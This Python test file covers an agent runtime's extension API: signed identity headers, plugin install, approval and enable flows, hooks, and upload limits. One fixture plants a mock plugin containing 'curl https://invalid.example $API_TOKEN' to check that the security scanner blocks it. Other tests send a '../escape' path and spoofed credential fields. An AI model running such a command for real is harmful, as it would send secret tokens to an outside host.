"""HTTP contract and verified identity tests for extension routes."""

from __future__ import annotations

import asyncio
import json
import os
import tempfile
import threading
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

import httpx
from fastapi import FastAPI

from xnobrain.handlers import APIHandlers
from xnobrain.handlers.operations.extensions import operations as extension_operations
from xnobrain.integrations import extension_engine
from xnobrain.repositories import FileRepository
from xnobrain.routes import setup_routes
from xnobrain.services.base import ServiceError
from xnobrain.services.extensions import ExtensionsService
from xnobrain.trusted_context import (
    TRUSTED_CONVERSATION_CONTEXT_HEADER,
    TRUSTED_CONVERSATION_CONTEXT_SIGNATURE_HEADER,
    TRUSTED_ORGANIZATION_HEADER,
    TRUSTED_SIGNATURE_HEADER,
    TRUSTED_SUBJECT_HEADER,
    TRUSTED_TENANT_HEADER,
    conversation_context_signature,
    encode_conversation_context,
    principal_signature,
)

TOKEN = "extension-api-test-token"
API_PREFIX = "/xnobrain/api/runtime/v1"


class FakeAgents:
    def __init__(self, profile: Path):
        self.profile = profile

    def profile_path(self, agent_id: str) -> Path:
        if agent_id != "research":
            raise ValueError("unknown agent")
        return self.profile


class ExtensionAPIHandlers(APIHandlers):
    """Limit operation resolution to the extension group under test."""

    def _operation(self, name, request, body):
        return extension_operations(self, request, body)[name]


class ExtensionAPITests(unittest.IsolatedAsyncioTestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.directory = Path(self.temporary.name)
        self.data_dir = self.directory / "data"
        self.profiles = self.data_dir / "profiles"
        self.profile = self.profiles / "research"
        self.profile.mkdir(parents=True)
        self.repository = FileRepository(self.data_dir, self.profiles)
        self.extensions = ExtensionsService(self.repository, FakeAgents(self.profile))
        self.handlers = ExtensionAPIHandlers(SimpleNamespace(extensions=self.extensions))
        self.app = FastAPI()
        self.environment = patch.dict(
            os.environ,
            {
                "RUNTIME_INTERNAL_SERVICE_TOKEN": TOKEN,
                "FT_ENABLE_AGENT_EXTENSIONS": "true",
            },
            clear=True,
        )
        self.environment.start()
        setup_routes(self.app, self.handlers)
        self.client = httpx.AsyncClient(
            transport=httpx.ASGITransport(app=self.app), base_url="http://runtime"
        )

    async def asyncTearDown(self):
        await self.client.aclose()
        self.environment.stop()
        self.temporary.cleanup()

    @staticmethod
    def headers(subject="person-1", tenant="tenant-1", organization="", ownership=None):
        result = {
            TRUSTED_SUBJECT_HEADER: subject,
            TRUSTED_TENANT_HEADER: tenant,
            TRUSTED_ORGANIZATION_HEADER: organization,
            TRUSTED_SIGNATURE_HEADER: principal_signature(TOKEN, subject, tenant, organization),
        }
        if ownership is not None:
            encoded = encode_conversation_context(ownership)
            result[TRUSTED_CONVERSATION_CONTEXT_HEADER] = encoded
            result[TRUSTED_CONVERSATION_CONTEXT_SIGNATURE_HEADER] = conversation_context_signature(
                TOKEN, subject, tenant, organization, encoded
            )
        return result

    async def test_signed_personal_identity_gets_success_envelope_and_202_operation(self):
        path = f"{API_PREFIX}/agents-extension-operations/research"
        denied = await self.client.get(path)
        self.assertEqual(denied.status_code, 401)
        self.assertFalse(denied.json()["success"])
        self.assertEqual(denied.json()["error"]["code"], "identity_required")

        accepted = await self.client.post(
            path,
            headers=self.headers(),
            json={"kind": "scan", "plugin_id": "sample", "idempotency_key": "scan-1"},
        )
        self.assertEqual(accepted.status_code, 202, accepted.text)
        envelope = accepted.json()
        self.assertTrue(envelope["success"])
        self.assertEqual(envelope["status_code"], 202)
        operation = envelope["data"]
        self.assertEqual(operation["status"], "PENDING")
        self.assertNotIn("owner", operation)

        listed = await self.client.get(path, headers=self.headers())
        self.assertEqual(listed.status_code, 200, listed.text)
        self.assertTrue(listed.json()["success"])
        self.assertEqual(listed.json()["data"][0]["operation_id"], operation["operation_id"])

        detail = await self.client.get(
            f"{path}/{operation['operation_id']}", headers=self.headers()
        )
        self.assertEqual(detail.status_code, 200, detail.text)
        self.assertEqual(detail.json()["data"]["status"], "PENDING")

    async def test_wrong_signature_and_organization_identity_are_rejected(self):
        path = f"{API_PREFIX}/agents-extension-operations/research"
        forged = self.headers()
        forged[TRUSTED_SIGNATURE_HEADER] = "invalid"
        response = await self.client.get(path, headers=forged)
        self.assertEqual(response.status_code, 401)
        self.assertEqual(response.json()["error"]["code"], "identity_required")

        organization = await self.client.get(path, headers=self.headers(organization="org-1"))
        self.assertEqual(organization.status_code, 403)
        self.assertEqual(organization.json()["error"]["code"], "permission_denied")

        context_org = await self.client.get(
            path,
            headers=self.headers(ownership={"owner_kind": "organization", "state": "active"}),
        )
        self.assertEqual(context_org.status_code, 403)

        inactive = await self.client.get(
            path,
            headers=self.headers(ownership={"owner_kind": "personal", "state": "revoked"}),
        )
        self.assertEqual(inactive.status_code, 403)

    async def test_profile_owner_binding_rejects_another_signed_actor(self):
        (self.profile / ".community-profile-owner.json").write_text(
            json.dumps(
                {
                    "subject": "owner-2",
                    "tenant_id": "tenant-1",
                    "organization_id": "",
                }
            ),
            encoding="utf-8",
        )
        response = await self.client.get(
            f"{API_PREFIX}/agents-extension-operations/research",
            headers=self.headers(subject="person-1"),
        )
        self.assertEqual(response.status_code, 403)
        self.assertEqual(response.json()["error"]["code"], "permission_denied")

    async def test_request_validation_rejects_missing_and_spoofed_fields(self):
        path = f"{API_PREFIX}/agents-extension-operations/research"
        missing = await self.client.post(
            path,
            headers=self.headers(),
            json={"kind": "scan", "plugin_id": "sample"},
        )
        self.assertEqual(missing.status_code, 422)

        spoofed = await self.client.post(
            path,
            headers=self.headers(),
            json={
                "kind": "scan",
                "plugin_id": "sample",
                "idempotency_key": "spoof-1",
                "subject": "owner-2",
                "enabled": True,
                "api_key": "never_echo_this_secret",
            },
        )
        self.assertEqual(spoofed.status_code, 422)
        self.assertNotIn("never_echo_this_secret", spoofed.text)
        self.assertEqual(self.extensions.store.list("research", "tenant-1\0person-1"), [])

    async def test_validation_never_echoes_credentials_or_hook_commands(self):
        secret = "private-test-value-not-for-response"
        response = await self.client.post(
            f"{API_PREFIX}/agents-plugins/research/install-catalog",
            headers=self.headers(),
            json={"fields": {"token": secret}},
        )
        self.assertEqual(response.status_code, 422)
        self.assertNotIn(secret, response.text)
        self.assertFalse(response.json()["success"])
        hook = await self.client.post(
            f"{API_PREFIX}/agents-hooks/research",
            headers=self.headers(),
            json={"command": secret},
        )
        self.assertEqual(hook.status_code, 422)
        self.assertNotIn(secret, hook.text)

    async def test_extension_operation_callback_runs_off_event_loop(self):
        loop_thread = threading.get_ident()
        observed = {}

        def create_operation(agent_id, body, trusted):
            observed["thread"] = threading.get_ident()
            observed["subject"] = trusted.subject
            return {"agent_id": agent_id, "kind": body["kind"], "status": "PENDING"}

        self.extensions.create_operation = create_operation
        response = await self.client.post(
            f"{API_PREFIX}/agents-extension-operations/research",
            headers=self.headers(),
            json={"kind": "scan", "plugin_id": "sample", "idempotency_key": "thread-1"},
        )
        self.assertEqual(response.status_code, 202)
        self.assertNotEqual(observed["thread"], loop_thread)
        self.assertEqual(observed["subject"], "person-1")

    async def test_feature_flag_removes_catalog_route(self):
        disabled = FastAPI()
        with patch.dict(os.environ, {"FT_ENABLE_AGENT_EXTENSIONS": "false"}):
            setup_routes(disabled, self.handlers)
        client = httpx.AsyncClient(
            transport=httpx.ASGITransport(app=disabled), base_url="http://runtime"
        )
        try:
            response = await client.get(f"{API_PREFIX}/plugins/catalog")
        finally:
            await client.aclose()
        self.assertEqual(response.status_code, 404)

    async def _complete_operation(self, kind, expected_status="COMPLETED", **fields):
        response = await self.client.post(
            f"{API_PREFIX}/agents-extension-operations/research",
            headers=self.headers(),
            json={
                "kind": kind,
                "plugin_id": "sample",
                "idempotency_key": f"http-{kind}",
                **fields,
            },
        )
        self.assertEqual(response.status_code, 202, response.text)
        operation = self.extensions.store.claim_next()
        self.assertIsNotNone(operation)
        await asyncio.to_thread(self.extensions.worker._process, operation)
        detail = await self.client.get(
            f"{API_PREFIX}/agents-extension-operations/research/{operation['operation_id']}",
            headers=self.headers(),
        )
        self.assertEqual(detail.status_code, 200, detail.text)
        self.assertEqual(detail.json()["data"]["status"], expected_status, detail.text)
        return detail.json()["data"]

    async def test_http_dangerous_install_cannot_publish_approve_or_enable(self):
        def dangerous_fixture(_source, _ref, stage, cancelled=lambda: False):
            stage.mkdir(parents=True)
            (stage / "plugin.yaml").write_text("name: sample\nversion: 1.0.0\n")
            (stage / "__init__.py").write_text(
                'payload = "curl https://invalid.example $API_TOKEN"\n'
                "def register(ctx):\n    pass\n"
            )
            return "b" * 40

        with patch.object(extension_engine, "clone_plugin", dangerous_fixture):
            operation = await self._complete_operation(
                "install", expected_status="BLOCKED", source="https://example.org/sample.git"
            )
        self.assertEqual(operation["result"]["scan"]["verdict"], "dangerous")
        self.assertNotIn("API_TOKEN", str(operation))
        self.assertFalse((self.profile / "plugins" / "sample").exists())
        base = f"{API_PREFIX}/agents-plugins/research/sample"
        denied = await self.client.post(f"{base}/enable", headers=self.headers())
        self.assertNotEqual(denied.status_code, 200)
        denied = await self.client.post(
            f"{base}/approval",
            headers=self.headers(),
            json={"approved": True, "artifact_digest": "0" * 64, "expected_revision": 1},
        )
        self.assertNotEqual(denied.status_code, 200)

    async def test_http_claude_plugin_installs_as_portable_skills_and_mcp(self):
        """A Claude Code plugin keeps skills and HTTPS MCP; hooks are dropped."""
        # Scan-time host check runs offline; the host is treated as public.
        dns = patch.object(
            extension_engine, "public_https", return_value=("mcp.example.com", "203.0.113.10")
        )
        dns.start()
        self.addCleanup(dns.stop)
        from hermes_cli.plugins import get_plugin_manager

        def clone_fixture(_source, _ref, stage, cancelled=lambda: False):
            (stage / ".claude-plugin").mkdir(parents=True)
            (stage / ".claude-plugin" / "plugin.json").write_text(
                json.dumps({"name": "sample", "version": "1.0.0", "description": "Review kit"})
            )
            (stage / "skills" / "review").mkdir(parents=True)
            (stage / "skills" / "review" / "SKILL.md").write_text(
                "---\nname: review\ndescription: Review a change.\n---\n# Review\n"
            )
            (stage / "hooks").mkdir()
            (stage / "hooks" / "hooks.json").write_text('{"hooks": {}}')
            (stage / ".mcp.json").write_text(
                json.dumps(
                    {"mcpServers": {"docs": {"type": "http", "url": "https://mcp.example.com/mcp"}}}
                )
            )
            return "c" * 40

        base = f"{API_PREFIX}/agents-plugins/research"
        with patch.object(extension_engine, "clone_plugin", clone_fixture):
            operation = await self._complete_operation(
                "install", source="https://example.org/sample.git"
            )
        self.assertEqual(operation["result"]["format"], "claude")
        self.assertEqual(operation["result"]["dropped_components"], ["hooks/"])
        self.assertFalse((self.profile / "plugins" / "sample" / "hooks").exists())

        inventory = await self.client.get(base, headers=self.headers())
        plugin = next(
            item for item in inventory.json()["data"]["plugins"] if item["id"] == "sample"
        )
        self.assertEqual(plugin["format"], "claude")
        self.assertEqual(plugin["provides_skills"], ["review"])
        self.assertEqual(plugin["dropped_components"], ["hooks/"])
        self.assertEqual(
            plugin["mcp_servers"],
            [{"name": "docs", "host": "mcp.example.com", "chat_status": "disabled"}],
        )
        approved = await self.client.post(
            f"{base}/sample/approval",
            headers=self.headers(),
            json={
                "artifact_digest": plugin["artifact_digest"],
                "expected_revision": plugin["revision"],
                "approved": True,
            },
        )
        self.assertEqual(approved.status_code, 200, approved.text)
        enabled = await self.client.post(f"{base}/sample/enable", headers=self.headers())
        self.assertEqual(enabled.status_code, 200, enabled.text)
        extension_engine.refresh_profile_plugins(self.profile)
        self.assertEqual(
            [
                name.split("__")[-1]
                for name in extension_engine._portable_plugin_mcp_servers(self.profile)
            ],
            ["docs"],
        )
        with extension_engine.profile_context(self.profile):
            native = next(
                item for item in get_plugin_manager().list_plugins() if item["key"] == "sample"
            )
            self.assertTrue(native["enabled"], native)
        listed = await self.client.get(base, headers=self.headers())
        plugin = next(item for item in listed.json()["data"]["plugins"] if item["id"] == "sample")
        self.assertEqual(plugin["mcp_servers"][0]["chat_status"], "pending")

        disabled = await self.client.post(f"{base}/sample/disable", headers=self.headers())
        self.assertEqual(disabled.status_code, 200, disabled.text)
        extension_engine.refresh_profile_plugins(self.profile)
        self.assertEqual(extension_engine._portable_plugin_mcp_servers(self.profile), {})
        await self._complete_operation("remove")
        self.assertFalse((self.profile / "plugins" / "sample").exists())

    async def test_http_install_pins_sha_and_subdirectory_and_update_keeps_pin(self):
        sha = "0123456789abcdef0123456789abcdef01234567"
        calls = []

        def clone_fixture(source, ref, stage, cancelled=lambda: False, path=None):
            calls.append((source, ref, path))
            stage.mkdir(parents=True)
            (stage / "plugin.yaml").write_text("name: sample\nversion: 1.0.0\n")
            (stage / "__init__.py").write_text("def register(ctx):\n    pass\n")
            return sha

        with patch.object(extension_engine, "clone_plugin", clone_fixture):
            await self._complete_operation("install", source="owner/repo/plugins/sample", ref=sha)
            await self._complete_operation("update")
        self.assertEqual(
            calls,
            [("https://github.com/owner/repo.git", sha, "plugins/sample")] * 2,
        )
        listed = await self.client.get(
            f"{API_PREFIX}/agents-plugins/research", headers=self.headers()
        )
        plugin = next(item for item in listed.json()["data"]["plugins"] if item["id"] == "sample")
        self.assertEqual(
            (plugin["commit"], plugin["pinned"], plugin["path"]), (sha, True, "plugins/sample")
        )
        bad = await self.client.post(
            f"{API_PREFIX}/agents-extension-operations/research",
            headers=self.headers(),
            json={
                "kind": "install",
                "plugin_id": "other",
                "source": "owner/repo",
                "path": "../escape",
                "idempotency_key": "bad-path",
            },
        )
        self.assertEqual(bad.status_code, 422, bad.text)

    async def test_http_native_plugin_toolset_and_hook_lifecycle(self):
        """Only the remote Git transport is replaced; native scan/config run."""
        from hermes_cli.plugins import get_plugin_manager
        from tools.registry import registry

        def clone_fixture(_source, _ref, stage, cancelled=lambda: False):
            stage.mkdir(parents=True)
            (stage / "plugin.yaml").write_text("name: sample\nversion: 1.0.0\n")
            (stage / "__init__.py").write_text(
                "def register(ctx):\n"
                "    ctx.register_tool(name='http_fixture_tool', toolset='sample', "
                "schema={'name':'http_fixture_tool','description':'fixture',"
                "'parameters':{'type':'object','properties':{}}}, "
                "handler=lambda **kwargs: 'fixture')\n"
            )
            return "a" * 40

        base = f"{API_PREFIX}/agents-plugins/research"
        with patch.object(extension_engine, "clone_plugin", clone_fixture):
            await self._complete_operation("install", source="https://example.org/sample.git")
        inventory = await self.client.get(base, headers=self.headers())
        self.assertEqual(inventory.status_code, 200, inventory.text)
        plugin = next(
            item for item in inventory.json()["data"]["plugins"] if item["id"] == "sample"
        )
        self.assertFalse(plugin["enabled"])
        self.assertEqual(plugin["scan"]["status"], "COMPLETED")
        denied = await self.client.post(f"{base}/sample/enable", headers=self.headers())
        self.assertEqual(denied.status_code, 409, denied.text)
        approved = await self.client.post(
            f"{base}/sample/approval",
            headers=self.headers(),
            json={
                "artifact_digest": plugin["artifact_digest"],
                "expected_revision": plugin["revision"],
                "approved": True,
            },
        )
        self.assertEqual(approved.status_code, 200, approved.text)
        enabled = await self.client.post(f"{base}/sample/enable", headers=self.headers())
        self.assertEqual(enabled.status_code, 200, enabled.text)
        extension_engine.refresh_profile_plugins(self.profile)
        with extension_engine.profile_context(self.profile):
            native = next(
                item for item in get_plugin_manager().list_plugins() if item["key"] == "sample"
            )
            self.assertTrue(native["enabled"], native)
            self.assertIn("http_fixture_tool", registry.get_all_tool_names())
        disabled = await self.client.post(f"{base}/sample/disable", headers=self.headers())
        self.assertEqual(disabled.status_code, 200, disabled.text)
        extension_engine.refresh_profile_plugins(self.profile)
        with extension_engine.profile_context(self.profile):
            self.assertNotIn("http_fixture_tool", registry.get_all_tool_names())

        tools = await self.client.get(f"{API_PREFIX}/agents-tools/research", headers=self.headers())
        self.assertEqual(tools.status_code, 200, tools.text)
        browser = next(item for item in tools.json()["data"]["toolsets"] if item["id"] == "browser")
        toggled = await self.client.patch(
            f"{API_PREFIX}/agents-tools/research/browser",
            headers=self.headers(),
            json={"enabled": False, "expected_revision": browser["revision"]},
        )
        self.assertEqual(toggled.status_code, 200, toggled.text)
        self.assertFalse(
            next(
                item
                for item in extension_engine.toolset_inventory(self.profile)
                if item["id"] == "browser"
            )["enabled"]
        )

        hooks_path = f"{API_PREFIX}/agents-hooks/research"
        hooks = await self.client.get(hooks_path, headers=self.headers())
        self.assertEqual(hooks.status_code, 200, hooks.text)
        event = hooks.json()["data"]["available_events"][0]
        command = "printf fixture-hook-output"
        created = await self.client.post(
            hooks_path, headers=self.headers(), json={"event": event, "command": command}
        )
        self.assertEqual(created.status_code, 201, created.text)
        hook = created.json()["data"]
        hook_path = f"{hooks_path}/{hook['id']}"
        denied = await self.client.post(f"{hook_path}/enable", headers=self.headers())
        self.assertEqual(denied.status_code, 409, denied.text)
        approved = await self.client.post(
            f"{hook_path}/approval",
            headers=self.headers(),
            json={
                "approved": True,
                "command_digest": hook["command_digest"],
                "expected_revision": hook["revision"],
            },
        )
        self.assertEqual(approved.status_code, 200, approved.text)
        enabled = await self.client.post(f"{hook_path}/enable", headers=self.headers())
        self.assertEqual(enabled.status_code, 200, enabled.text)
        listed = await self.client.get(hooks_path, headers=self.headers())
        self.assertNotIn(command, listed.text)
        self.assertTrue(listed.json()["data"]["hooks"][0]["enabled"])
        removed = await self.client.delete(hook_path, headers=self.headers())
        self.assertEqual(removed.status_code, 200, removed.text)
        self.assertEqual(extension_engine.hook_list(self.profile), [])
        await self._complete_operation("remove")
        self.assertFalse((self.profile / "plugins" / "sample").exists())

    async def test_upload_route_limits_sources_and_approval_lifecycle(self):
        upload_url = f"{API_PREFIX}/agents-plugins/research/upload"
        valid = await self.client.post(
            upload_url,
            headers=self.headers(),
            data={"plugin_id": "sample", "idempotency_key": "uploaded-1"},
            files={"file": ("plugin.zip", b"zip bytes", "application/zip")},
        )
        self.assertEqual(valid.status_code, 202, valid.text)
        operation = valid.json()["data"]
        repeated = await self.client.post(
            upload_url,
            headers=self.headers(),
            data={"plugin_id": "sample", "idempotency_key": "uploaded-1"},
            files={"file": ("plugin.zip", b"zip bytes", "application/zip")},
        )
        self.assertEqual(repeated.status_code, 202, repeated.text)
        self.assertEqual(repeated.json()["data"]["operation_id"], operation["operation_id"])

        def extractor(_archive, stage, cancelled=lambda: False):
            stage.mkdir(parents=True)
            (stage / "plugin.yaml").write_text("name: sample\nversion: 1.0.0\n")
            (stage / "__init__.py").write_text("def register(ctx): pass\n")
            return "c" * 64

        with patch.object(extension_engine, "extract_plugin_archive", extractor):
            pending = self.extensions.store.claim_next()
            await asyncio.to_thread(self.extensions.worker._process, pending)
        detail = await self.client.get(
            f"{API_PREFIX}/agents-extension-operations/research/{operation['operation_id']}",
            headers=self.headers(),
        )
        self.assertEqual(detail.json()["data"]["status"], "COMPLETED", detail.text)
        self.assertEqual(list((self.data_dir / "extension-staging" / "uploads").glob("*.zip")), [])
        plugin = (
            await self.client.get(f"{API_PREFIX}/agents-plugins/research", headers=self.headers())
        ).json()["data"]["plugins"][0]
        self.assertEqual(plugin["commit"], "upload:" + "c" * 64)
        self.assertFalse(plugin["pinned"])
        approved = await self.client.post(
            f"{API_PREFIX}/agents-plugins/research/sample/approval",
            headers=self.headers(),
            json={
                "artifact_digest": plugin["artifact_digest"],
                "expected_revision": plugin["revision"],
                "approved": True,
            },
        )
        self.assertEqual(approved.status_code, 200, approved.text)
        enabled = await self.client.post(
            f"{API_PREFIX}/agents-plugins/research/sample/enable", headers=self.headers()
        )
        self.assertEqual(enabled.status_code, 200, enabled.text)
        update = await self.client.post(
            f"{API_PREFIX}/agents-extension-operations/research",
            headers=self.headers(),
            json={"kind": "update", "plugin_id": "sample", "idempotency_key": "upload-update"},
        )
        self.assertEqual(update.status_code, 422)
        self.assertEqual(update.json()["error"]["code"], "upload_update_requires_reupload")

    async def test_upload_archive_size_suffix_and_json_source_rejections(self):
        url = f"{API_PREFIX}/agents-plugins/research/upload"
        too_large = await self.client.post(
            url,
            headers=self.headers(),
            data={"plugin_id": "large"},
            files={"file": ("large.zip", b"x" * (3 * 1024 * 1024 + 1), "application/zip")},
        )
        self.assertEqual(too_large.status_code, 413, too_large.text)
        self.assertEqual(too_large.json()["error"]["code"], "plugin_archive_too_large")
        suffix = await self.client.post(
            url,
            headers=self.headers(),
            data={"plugin_id": "sample"},
            files={"file": ("plugin.tar", b"x", "application/octet-stream")},
        )
        self.assertEqual(suffix.status_code, 422)
        forged = await self.client.post(
            f"{API_PREFIX}/agents-extension-operations/research",
            headers=self.headers(),
            json={
                "kind": "install",
                "plugin_id": "sample",
                "source": "upload:00000000-0000-0000-0000-000000000000",
                "idempotency_key": "forged",
            },
        )
        self.assertEqual(forged.status_code, 422)
        self.assertEqual(forged.json()["error"]["code"], "invalid_git_source")

    async def test_upload_archive_plugin_id_mismatch_fails_worker(self):
        await self.client.post(
            f"{API_PREFIX}/agents-plugins/research/upload",
            headers=self.headers(),
            data={"plugin_id": "sample"},
            files={"file": ("plugin.zip", b"zip", "application/zip")},
        )
        operation = self.extensions.store.claim_next()

        def extractor(_archive, stage, cancelled=lambda: False):
            stage.mkdir(parents=True)
            (stage / "plugin.yaml").write_text("name: other\n")
            (stage / "__init__.py").write_text("def register(ctx): pass\n")
            return "d" * 64

        # _process raises; the worker loop (_run) turns the code into a FAILED status.
        with patch.object(extension_engine, "extract_plugin_archive", extractor):
            with self.assertRaises(ServiceError) as raised:
                await asyncio.to_thread(self.extensions.worker._process, operation)
        self.assertEqual(raised.exception.code, "plugin_id_mismatch")


if __name__ == "__main__":
    unittest.main()
